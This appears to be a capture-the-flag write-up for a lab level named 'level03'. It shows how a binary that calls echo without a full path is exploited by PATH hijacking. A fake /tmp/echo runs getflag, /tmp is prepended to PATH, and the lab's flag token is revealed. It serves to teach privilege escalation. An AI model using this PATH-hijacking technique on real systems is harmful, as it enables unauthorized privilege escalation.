@@ -1,0 +1,44 @@
+$> ls
+we have an executable 'level03'
+
+$> ./level03
+-> 'Exploit me'
+
+Copy the file locally
+$> scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 ~/Desktop/Shared_Folder
+
+
+https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469
+
+Use the strings command to extract all human-readable snippets from the binary and discovered that it used the echo command to get the localhost. Because it does not specify the whole path of echo, we can develop a malicious payload called echo and add it to the path.
+
+$> strings level03
+we get this string:
+/usr/bin/env echo Exploit me
+
+$> which getflag  //to get the command path
+
+$> echo /bin/getflag > /tmp/echo
+$> chmod 777 /tmp/echo
+
+$> echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+To run a command, it will look from left to right, starting at /usr/local/sbin, etc.
+We want it to look for the echo command in the /tmp folder, so we have to add this path to the $PATH env variable. Each path is separated by a ":".
+
+$> export PATH=/tmp:$PATH
+
+Verify if we have what we want
+$> echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+Execute ./level03 again
+-> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+$> su level04 with qi0maab88jeaj46qoumi7maus
+(no user flag03)
+
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
